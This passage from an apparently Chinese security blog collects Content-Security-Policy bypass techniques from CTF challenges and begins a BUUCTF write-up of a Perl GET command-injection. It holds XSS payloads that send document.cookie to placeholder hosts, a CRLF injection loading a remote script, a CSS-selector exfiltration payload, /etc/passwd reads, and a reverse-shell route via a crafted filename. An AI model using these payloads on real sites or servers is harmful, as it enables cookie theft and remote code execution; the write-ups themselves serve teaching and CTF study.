<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">CWS</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span> xml = <span class="keyword">new</span> XMLHttpRequest(); xml.open(<span class="string">'POST'</span>, <span class="string">'http://xss.xxxxx.cc'</span>, <span class="literal">true</span>); xml.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>); xml.send(<span class="string">'cookie='</span>+<span class="built_in">document</span>.cookie); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>通过import引入 加载</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">'import'</span> <span class="attr">href</span>=<span class="string">'/upload/xxxxx'</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>在l3m0n师傅的博客中看到，如果遇到这种情况，上传只能上传到upload目录，但是csp限制只能在static目录下加载js</p>
<p>HITCON2016</p>
<p>payload 如下，通过%2f bypass</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;scscriptript src=<span class="string">"http://sguestbook.hctf.io/static/..%2fupload/a32642750cae25f4c5b020d9a66c5c5c"</span>&gt;&lt;<span class="regexp">/scscriptript&gt;</span></span><br></pre></td></tr></table></figure>

<p>个人对这个payload的理解的话就是因为%2f在未解吗之前是属于static目录下的资源，经过src的调用，%2f解码为/，最终实际调用了upload目录下面的资源。</p>
<p>还有梅子酒师傅的[<a href="https://meizjm3i.github.io/2018/05/12/Use%20Wave%20File%20Bypass%20CSP/]" target="_blank" rel="noopener">https://meizjm3i.github.io/2018/05/12/Use%20Wave%20File%20Bypass%20CSP/]</a>(<a href="https://meizjm3i.github.io/2018/05/12/Use" target="_blank" rel="noopener">https://meizjm3i.github.io/2018/05/12/Use</a> Wave File Bypass CSP/)</p>
<p>通过wave文件Bypass CSP</p>
<h4 id="302跳转Bypass-CSP"><a href="#302跳转Bypass-CSP" class="headerlink" title="302跳转Bypass CSP"></a>302跳转Bypass CSP</h4><p>CSP规则如下</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy:default-src 'self'; script-src http://sguestbook.hctf.io/static/ 'sha256-n+kMAVS5Xj7r/dvV9ZxAbEX6uEmK+uen+HZXbLhVsVA=' 'sha256-2zDCsAh4JN1o1lpARla6ieQ5KBrjrGpn0OAjeJ1V9kg=' 'sha256-SQQX1KpZM+ueZs+PyglurgqnV7jC8sJkUMsG9KkaFwQ=' 'sha256-JXk13NkH4FW9/ArNuoVR9yRcBH7qGllqf1g5RnJKUVg=' 'sha256-NL8WDWAX7GSifPUosXlt/TUI6H8JU0JlK7ACpDzRVUc=' 'sha256-CCZL85Vslsr/bWQYD45FX+dc7bTfBxfNmJtlmZYFxH4=' 'sha256-2Y8kG4IxBmLRnD13Ne2JV/V106nMhUqzbbVcOdxUH8I=' 'sha256-euY7jS9jMj42KXiApLBMYPZwZ6o97F7vcN8HjBFLOTQ=' 'sha256-V6Bq3u346wy1l0rOIp59A6RSX5gmAiSK40bp5JNrbnw='; font-src http://sguestbook.hctf.io/static/ fonts.gstatic.com; style-src 'self' 'unsafe-inline'; img-src 'self'</span><br></pre></td></tr></table></figure>

<ul>
<li><p>script-src只允许加载static目录下的js，static下有一个redirect.php</p>
<p>写一个js上传，通过302跳转Bypass掉CSP</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;scscriptript src=<span class="string">"http://115.28.78.16:12222/static/redirect.php?u=/upload/cf4b03010ddaafec5933f656fad2692d"</span>&gt;&lt;<span class="regexp">/scriscriptpt&gt;</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>当然，我们之前说的那个payload也可以</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;scscriptript src=<span class="string">"http://sguestbook.hctf.io/static/..%2fupload/a32642750cae25f4c5b020d9a66c5c5c"</span>&gt;&lt;<span class="regexp">/scscriptript&gt;</span></span><br></pre></td></tr></table></figure>

<p><a href="https://www.freebuf.com/articles/web/121778.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/121778.html</a></p>
<h4 id="JSONP-Bypass-CSP"><a href="#JSONP-Bypass-CSP" class="headerlink" title="JSONP Bypass CSP"></a>JSONP Bypass CSP</h4><p><a href="https://corb3nik.github.io/blog/ins-hack-2019/bypasses-everywhere" target="_blank" rel="noopener">https://corb3nik.github.io/blog/ins-hack-2019/bypasses-everywhere</a></p>
<p>很有趣的题，看了一遍感觉学到了很多</p>
<p>通过第一个iframe的callback，调用父窗口改写第二个iframe的内容，从而加载第一个中documen.write,最终加载了我们vps上的恶意文件</p>
<p>因为csp的白名单上有Google，所以我们可以通过寻找google上的jsonp的回调函数点配合注释，执行任意js</p>
<h4 id="CDN回调函数Bypass-CSP"><a href="#CDN回调函数Bypass-CSP" class="headerlink" title="CDN回调函数Bypass CSP"></a>CDN回调函数Bypass CSP</h4><p>在前端开发的时候会调用许多前端的框架和库，而为了减少服务器上面的压力或者减少占用资源等，有时会引入其他cdn上的js框架，当cdn上存在一些低版本的框架，即有可能存在绕过csp的风险</p>
<p>比如 <a href="https://paper.seebug.org/855/" target="_blank" rel="noopener">https://paper.seebug.org/855/</a></p>
<p>hackme的CSP引用cloudflare.com CDN服务，于是这篇文章的作者Orange师傅（tql)采取引用低版本的angular js模板注入来绕过CSP</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src 'unsafe-eval' https://cdnjs.cloudflare.com;"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- foo="--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span>&gt;</span></span><br><span class="line">    &#123;&#123;constructor.constructor('alert(document.cookie)')()&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><a href="https://imgchr.com/i/K5FiWR" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/30/K5FiWR.md.png" alt="K5FiWR.md.png"></a></p>
<p>evoA师傅中博客列出出来的<a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js#L26-L76（存在低版本angular" target="_blank" rel="noopener">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js#L26-L76（存在低版本angular</a> js的cdn服务商列表）</p>
<h4 id="通过加载js库Bypass-CSP"><a href="#通过加载js库Bypass-CSP" class="headerlink" title="通过加载js库Bypass CSP"></a>通过加载js库Bypass CSP</h4><p>如果用了Jquery-mobile库，且CSP中包含”script-src ‘unsafe-eval’”或者”script-src ‘strict-dynamic’”</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-role</span>=<span class="string">popup</span> <span class="attr">id</span>=<span class="string">'&lt;script&gt;alert(1)&lt;/script&gt;'</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>RCTF2018的 AMP库，通过如下payload获得名字为flag的cookie</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">amp-pixel</span> <span class="attr">src</span>=<span class="string">"http://your domain/?cid=CLIENT_ID(FLAG)"</span>&gt;</span><span class="tag">&lt;/<span class="name">amp-pixel</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>常被用来绕过CSP的js库：</p>
<p><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf</a></p>
<h4 id="url跳转Bypass-CSP"><a href="#url跳转Bypass-CSP" class="headerlink" title="url跳转Bypass CSP"></a>url跳转Bypass CSP</h4><p>在script-src允许unsafe-inline的情况下，CSP如下</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">Content-Security-Policy:default-src 'self'; script-src 'self' 'unsafe-inline'; font-src 'self' fonts.gstatic.com; style-src 'self' 'unsafe-inline'; img-src 'self'</span><br></pre></td></tr></table></figure>

<p>可以通过window.location,document.location,location.href进行跳转Bypas</p>
<p>(img-src不限制的情况下)同时还可以通过img标签的src属性打xss</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> i = <span class="built_in">document</span>.createElement(<span class="string">'img'</span>);</span><br><span class="line">i.src = <span class="string">'http://xxx.com'</span> + <span class="built_in">document</span>.cookie;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(i);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>从decade师傅那里看到有一个Bypass <code>.</code>的操作，学习了</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> i = <span class="built_in">document</span>[<span class="string">'createElement'</span>](<span class="string">'img'</span>);</span><br><span class="line">i[<span class="string">'src'</span>] = <span class="built_in">String</span>[<span class="string">'fromCharCode'</span>](http:<span class="comment">//xxx.com 所对应的 Ascii 码，用逗号分隔) + document['cookie'];</span></span><br><span class="line"><span class="built_in">document</span>[<span class="string">'body'</span>][<span class="string">'appendChild'</span>](i);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>同理iframe a audio等标签的src也都可以使用</p>
<h4 id="通过CRLF-Bypass-CSP"><a href="#通过CRLF-Bypass-CSP" class="headerlink" title="通过CRLF Bypass CSP"></a>通过CRLF Bypass CSP</h4><p><a href="https://github.com/Lou00/HCTF2018_Bottle" target="_blank" rel="noopener">https://github.com/Lou00/HCTF2018_Bottle</a></p>
<p>两个有意思的点</p>
<ul>
<li>首先是在Firefox浏览器下端口小于80则不会跳转</li>
<li>hearder下面两个%0a%0d将CSP内容挤到响应的下方，直接导致CSP无效</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bottle.2018.hctf.io&#x2F;path?path&#x3D;http:&#x2F;&#x2F;bottle.2018.hctf.io:22&#x2F;%0d%0aContent-Length:%2065%0d%0a%0d%0a%3Cscript%20src&#x3D;http:&#x2F;&#x2F;youvps&#x2F;cookie.js%3E%3C&#x2F;script%3E</span><br><span class="line">####</span><br></pre></td></tr></table></figure>

<h4 id="SVG-Bypass-CSP"><a href="#SVG-Bypass-CSP" class="headerlink" title="SVG Bypass CSP"></a>SVG Bypass CSP</h4><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">svg</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"-//W3C//DTD SVG 1.1//EN"</span> <span class="meta-string">"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">"1.1"</span> <span class="attr">id</span>=<span class="string">"Layer_1"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">xmlns:xlink</span>=<span class="string">"http://www.w3.org/1999/xlink"</span> <span class="attr">x</span>=<span class="string">"0px"</span> <span class="attr">y</span>=<span class="string">"0px"</span> <span class="attr">width</span>=<span class="string">"100px"</span> <span class="attr">height</span>=<span class="string">"100px"</span> <span class="attr">viewBox</span>=<span class="string">"0 0 751 751"</span> <span class="attr">enable-background</span>=<span class="string">"new 0 0 751 751"</span> <span class="attr">xml:space</span>=<span class="string">"preserve"</span>&gt;</span>  <span class="tag">&lt;<span class="name">image</span> <span class="attr">id</span>=<span class="string">"image0"</span> <span class="attr">width</span>=<span class="string">"751"</span> <span class="attr">height</span>=<span class="string">"751"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">href</span>=<span class="string">"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>访问svg文件即可触发xss</p>
<p>详见  <a href="https://xz.aliyun.com/t/4492" target="_blank" rel="noopener">https://xz.aliyun.com/t/4492</a></p>
<h4 id="Flash-XSS"><a href="#Flash-XSS" class="headerlink" title="Flash XSS"></a>Flash XSS</h4><p><a href="https://lorexxar.cn/2016/11/30/hctf2016-xss/#secret-area" target="_blank" rel="noopener">https://lorexxar.cn/2016/11/30/hctf2016-xss/#secret-area</a></p>
<h4 id="通过CSS选择器获取内容"><a href="#通过CSS选择器获取内容" class="headerlink" title="通过CSS选择器获取内容"></a>通过CSS选择器获取内容</h4><p>测试代码</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self';script-src 'self'; style-src 'unsafe-inline';img-src *"</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">"test"</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Payload如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;problem&#x2F;css.php?xss&#x3D;&lt;style&gt;input[value^&#x3D;&quot;t&quot;] &#123;background-image:url(&quot;http:&#x2F;&#x2F;attack&#x2F;?t&quot;)&#125;&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>

<p><a href="https://imgchr.com/i/KIeQGF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/31/KIeQGF.md.png" alt="KIeQGF.md.png"></a></p>
<p>需要Style可以内敛，img可以不同源，可新建标签。</p>
<h3 id="CSP的进化以及Bypass"><a href="#CSP的进化以及Bypass" class="headerlink" title="CSP的进化以及Bypass"></a>CSP的进化以及Bypass</h3><p>Google团队2016年在<a href="https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/45542.pdf" target="_blank" rel="noopener">CSP is Dead, Long live CSP</a>中正式提出的CSP种类，为了解决CSP爆出的各种各样的问题。</p>
<h3 id="nonce-script-CSP"><a href="#nonce-script-CSP" class="headerlink" title="nonce script CSP"></a>nonce script CSP</h3><p>动态生成nonce字符串，只有包含nonce字段并字符串相等的script块可以被执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Header(<span class="string">"Content-Security-Policy: script-src 'nonce-"</span>.$random.<span class="string">" '"</span>);<span class="meta">?&gt;</span></span><br><span class="line">&lt;script nonce=<span class="string">"&lt;?php echo $random?&gt;"</span>&gt;</span><br></pre></td></tr></table></figure>

<p>这个字符串可以在后端实现，每次请求都重新生成，这样就可以无视哪个域是可信的，保证所加载的任何资源都是可信的，并且还能拦截后面插入的script。</p>
<p>这个的Bypass前面加举了几个例子，只不过条件是特殊的…应该也不能算Bypass，emm之前的css在合适的条件下也可以Bypass</p>
<p><a href="https://lorexxar.cn/2017/05/16/nonce-bypass-script/" target="_blank" rel="noopener">https://lorexxar.cn/2017/05/16/nonce-bypass-script/</a> 利用浏览器缓存Bypass CSP script nonce</p>
<h3 id="strict-dynamic"><a href="#strict-dynamic" class="headerlink" title="strict-dynamic"></a>strict-dynamic</h3><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self'; script-src 'strict-dynamic'</span><br></pre></td></tr></table></figure>

<p>SD意味着可信js生成的js代码是可信的。</p>
<p>这个CSP规则主要是用来适应各种各样的现代前端框架，通过这个规则，可以大幅度避免因为适应框架而变得松散的CSP规则。</p>
<p>strict-dynamic结合gadget绕过CSP</p>
<p><a href="https://www.mi1k7ea.com/2019/02/21/一道绕过CSP的XSS题目/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/02/21/%E4%B8%80%E9%81%93%E7%BB%95%E8%BF%87CSP%E7%9A%84XSS%E9%A2%98%E7%9B%AE/</a></p>
<h3 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h3><p>写一些和本文无关的话题，19年，终于遇到了这么可爱的她了233，虽然相距很远吧，但我觉得应该还是有机会的，在2019年的这个年末，我一定会更加努力，去变得优秀一些，希望最终可以和宁在一起吧，宁真的好可爱啊！</p>
<h3 id="后后记"><a href="#后后记" class="headerlink" title="后后记"></a>后后记</h3><p>PS：（11.17 更新）我莫得感情 🙂</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><a href="https://lorexxar.cn/2016/08/08/ccsp/#Bypass-CSP" target="_blank" rel="noopener">https://lorexxar.cn/2016/08/08/ccsp/#Bypass-CSP</a></p>
<p><a href="https://lorexxar.cn/2017/05/16/nonce-bypass-script/" target="_blank" rel="noopener">https://lorexxar.cn/2017/05/16/nonce-bypass-script/</a></p>
<p><a href="https://hurricane618.me/2018/06/30/csp-bypass-summary/#利用DOM-XSS" target="_blank" rel="noopener">https://hurricane618.me/2018/06/30/csp-bypass-summary/#%E5%88%A9%E7%94%A8DOM-XSS</a></p>
<p><a href="https://wulidecade.cn/2018/09/24/CSP-And-CSP-Bypass/" target="_blank" rel="noopener">https://wulidecade.cn/2018/09/24/CSP-And-CSP-Bypass/</a></p>
<p><a href="https://xz.aliyun.com/t/318#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/318#toc-5</a></p>
<p><a href="https://evoa.me/index.php/archives/53/#toc-CSS选择器获取内容" target="_blank" rel="noopener">https://evoa.me/index.php/archives/53/#toc-CSS%E9%80%89%E6%8B%A9%E5%99%A8%E8%8E%B7%E5%8F%96%E5%86%85%E5%AE%B9</a></p>
<p>[<a href="https://meizjm3i.github.io/2018/05/12/Use%20Wave%20File%20Bypass%20CSP/]" target="_blank" rel="noopener">https://meizjm3i.github.io/2018/05/12/Use%20Wave%20File%20Bypass%20CSP/]</a>(<a href="https://meizjm3i.github.io/2018/05/12/Use" target="_blank" rel="noopener">https://meizjm3i.github.io/2018/05/12/Use</a> Wave File Bypass CSP/)</p>
<p><a href="https://www.mi1k7ea.com/2019/02/21/一道绕过CSP的XSS题目/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/02/21/%E4%B8%80%E9%81%93%E7%BB%95%E8%BF%87CSP%E7%9A%84XSS%E9%A2%98%E7%9B%AE/</a></p>
<p><a href="https://lorexxar.cn/2017/02/16/cdn-bypass-csp/#通过目录绕过，引入一个AngularJS" target="_blank" rel="noopener">https://lorexxar.cn/2017/02/16/cdn-bypass-csp/#%E9%80%9A%E8%BF%87%E7%9B%AE%E5%BD%95%E7%BB%95%E8%BF%87%EF%BC%8C%E5%BC%95%E5%85%A5%E4%B8%80%E4%B8%AAAngularJS</a></p>
<p><a href="https://www.freebuf.com/articles/web/121778.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/121778.html</a></p>
]]></content>
      <tags>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>BUUCTF-Writeup(一)</title>
    <url>/2019/07/13/BUUCTF-Writeup-%D2%BB/</url>
    <content><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>不错的平台，记录一些Writeup，也可以给其他人一个参考。</p>
<h3 id="SSRFme"><a href="#SSRFme" class="headerlink" title="SSRFme"></a>SSRFme</h3><p>代码如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">isset</span>($_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>])) &#123;</span><br><span class="line">    $_SERVER[<span class="string">'REMOTE_ADDR'</span>] = $_SERVER[<span class="string">'HTTP_X_FORWARDED_FOR'</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  $sandbox = <span class="string">"sandbox/"</span> . md5(<span class="string">"orange"</span> . $_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">  @mkdir($sandbox);</span><br><span class="line">  @chdir($sandbox);</span><br><span class="line"></span><br><span class="line">   $data = shell_exec(<span class="string">"GET "</span> . escapeshellarg($_GET[<span class="string">"url"</span>]));</span><br><span class="line">   $info = pathinfo($_GET[<span class="string">"filename"</span>]);</span><br><span class="line">   $dir  = str_replace(<span class="string">"."</span>, <span class="string">""</span>, basename($info[<span class="string">"dirname"</span>]));</span><br><span class="line">   @mkdir($dir);</span><br><span class="line">   @chdir($dir);</span><br><span class="line">   @file_put_contents(basename($info[<span class="string">"basename"</span>]), $data);</span><br><span class="line">   highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>

<p>原题为<code>HITCON 2017</code>，这段代码大概意思为，首先通过XFF判断用户ip,建立沙盒，并且通过<code>GET</code>传入<code>url</code>和<code>filename</code>两个参数，通过filename建立新的目录以及文件名，通过url进行<code>shell_exec</code>的GET命令执行，最终把执行的结果放在新生成的目录下的文件名中。</p>
<h4 id="首先来研究一下pathinfo函数以及basename函数的机制"><a href="#首先来研究一下pathinfo函数以及basename函数的机制" class="headerlink" title="首先来研究一下pathinfo函数以及basename函数的机制"></a>首先来研究一下pathinfo函数以及basename函数的机制</h4><p><img src="https://s2.ax1x.com/2019/07/11/Z2sbAs.png" alt="Z2sbAs.png"></p>
<p><code>basename()</code> 函数返回路径中的文件名部分,对于如下代码：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$path = <span class="string">"/testweb/home.php"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//显示带有文件扩展名的文件名</span></span><br><span class="line"><span class="keyword">echo</span> basename($path);   <span class="comment">//home.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//显示不带有文件扩展名的文件名</span></span><br><span class="line"><span class="keyword">echo</span> basename($path,<span class="string">".php"</span>);  <span class="comment">//home</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>代码对于想要建立的目录都会进行两边<code>basename</code>，对于如下代码做下实验：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $data = shell_exec(<span class="string">"GET "</span> . escapeshellarg($_GET[<span class="string">"url"</span>]));</span><br><span class="line">    $info = pathinfo($_GET[<span class="string">"filename"</span>]);</span><br><span class="line">    $dir  = str_replace(<span class="string">"."</span>, <span class="string">""</span>, basename($info[<span class="string">"dirname"</span>]));</span><br><span class="line">    <span class="keyword">echo</span> $dir;	</span><br><span class="line">    <span class="keyword">echo</span> $info[<span class="string">"dirname"</span>]; <span class="comment">//$c</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"/n"</span>;</span><br><span class="line">    <span class="keyword">echo</span> basename($info[<span class="string">'basename'</span>]);</span><br></pre></td></tr></table></figure>

<p>如果<code>filename</code>为/a或者a这样的形式，<code>basename($info[&#39;basename&#39;]);</code>肯定是为a的，此时的目录为当前目录，再次用<code>basename</code>返回路径中的文件名肯定为空。<strong>如果为<code>a/xxx/</code>，<code>$c和$dir</code>返回的都是a，解释一下原因：第一次返回的<code>basename</code>为<code>a</code>其实相当于<code>./a</code>，那么第二次再用<code>basename</code>返回的文件名肯定也是<code>a</code>。</strong>那么比较透彻的理解了这个函数，下面的也更好做一写了。</p>
<h4 id="escapeshellarg与escapeshellcmd函数"><a href="#escapeshellarg与escapeshellcmd函数" class="headerlink" title="escapeshellarg与escapeshellcmd函数"></a>escapeshellarg与escapeshellcmd函数</h4><p><strong>escapeshellarg</strong></p>
<p>1.确保用户只传递一个参数给命令<br>2.用户不能指定更多的参数一个<br>3.用户不能执行不同的命令</p>
<p>其实我的理解就是把传入的字符串加单引号，如果我传入的是<code>ls</code>，那么经过函数操作后就变成了<code>&#39;ls&#39;</code>。同时会对传入的单引号进行一些安全处理，例如传入<code>l&#39;s</code>，那么经过处理就会变成</p>
<p><code>&#39;l&#39;\&#39;&#39;s&#39;</code>。但是结合了<code>escapeshellcmd</code>就会造成一些危险的问题。函数简单介绍如下：</p>
<p>1.确保用户只执行一个命令<br>2.用户可以指定不限数量的参数<br>3.用户不能执行不同的命令</p>
<p>其作用也就是将一些危险符号进行转义，如</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&amp;，|，；，\ `</span><br></pre></td></tr></table></figure>

<p>下面会有详解。</p>
<h4 id="GET命令漏洞"><a href="#GET命令漏洞" class="headerlink" title="GET命令漏洞"></a>GET命令漏洞</h4><p>根本原因还是在于<code>perl</code>的<code>GET</code>函数底层实际上调用的是<code>open</code>处理，而在<code>perl</code>中，open是可以执行系统命令的。</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">root@iZuf6420mwa64xegn82ysrZ:~<span class="comment"># cat 1.pl</span></span><br><span class="line"><span class="keyword">open</span>(FD,<span class="string">"|id"</span>);</span><br><span class="line"><span class="keyword">print</span> &lt;FD&gt;;</span><br><span class="line">root@iZuf6420mwa64xegn82ysrZ:~<span class="comment"># perl 1.pl</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br></pre></td></tr></table></figure>

<p>从这段命令我们可看出来perl中open的作用。同时open是支持file协议的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">The library supports GET and HEAD methods for file requests.  The</span><br><span class="line">&quot;If-Modified-Since&quot; header is supported.  All other headers are</span><br><span class="line">ignored.  The I&lt;host&gt; component of the file URL must be empty or set</span><br><span class="line">to &quot;localhost&quot;.  Any other I&lt;host&gt; value will be treated as an error.</span><br><span class="line">Directories are always converted to an HTML document.  For normal</span><br><span class="line">files, the &quot;Content-Type&quot; and &quot;Content-Encoding&quot; in the response are</span><br><span class="line">guessed based on the file suffix.</span><br><span class="line">Example:</span><br><span class="line">  $req &#x3D; HTTP::Request-&gt;new(GET &#x3D;&gt; &#39;file:&#x2F;etc&#x2F;passwd&#39;);</span><br></pre></td></tr></table></figure>

<p>尝试一下file协议读取 <code>GET &#39;file:/etc/passwd&#39;</code>或者<code>GET &#39;/etc/passwd&#39;</code>，都可以成功读取出文件内容。下面来尝试下执行系统命令。</p>
<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">root@iZuf6420mwa64xegn82ysrZ:~<span class="comment"># touch 'ls|'</span></span><br><span class="line">root@iZuf6420mwa64xegn82ysrZ:~<span class="comment"># GET 'file:ls|'</span></span><br></pre></td></tr></table></figure>

<p>通过以上命令成功执行。这里需要注意的是必须要有存在的文件名才能成功执行命令，所以在上面建立了一个<code>ls|</code>文件。</p>
<p>那么这道题的思路就是建立命令执行的文件名，再通过file协议去执行就可以了</p>
<p>首先先看一下大概目录</p>
<p>通过Payload url=/&amp;filename=xxx，然后访问沙盒里面的xxx文件</p>
<p><img src="https://s2.ax1x.com/2019/07/11/ZRn3FI.png" alt="ZRn3FI.png"></p>
<p>发现<code>flag</code>和<code>readflag</code>,flag是空的，readflag似乎是一个二进制文件？，或许需要通过触发readflag来读取flag。</p>
<p>构造文件名 <code>bash -c /readflag</code>,通过如下payload</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url&#x3D;&#x2F;etc&#x2F;passwd&amp;filename&#x3D;bash -c &#x2F;readflag|</span><br><span class="line"></span><br><span class="line">url&#x3D;file:bash -c &#x2F;readflag|&amp;filename&#x3D;a</span><br></pre></td></tr></table></figure>

<p>访问沙盒下的a可以得到flag（这里的<code>/etc/passwd</code>的目的只是为了让我的GET命令请求快点)</p>
<p>第二种方法可以利用反弹shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">url&#x3D;http:&#x2F;&#x2F;your_vps&#x2F;port&amp;filename&#x3D;a</span><br><span class="line"></span><br><span class="line">url&#x3D;&#x2F;etc&#x2F;passwd&amp;filename&#x3D;bash a|</span><br><span class="line"></span><br><span class="line">url&#x3D;file:bash a|&amp;filename&#x3D;xxx</span><br></pre></td></tr></table></figure>

<p>同样需要在你的vps上放一下一句话反弹bash。</p>
<h3 id="Comment"><a href="#Comment" class="headerlink" title="Comment"></a>Comment</h3><p>git泄露，<code>git_extract</code>导出一下，代码泄露如下：</p>
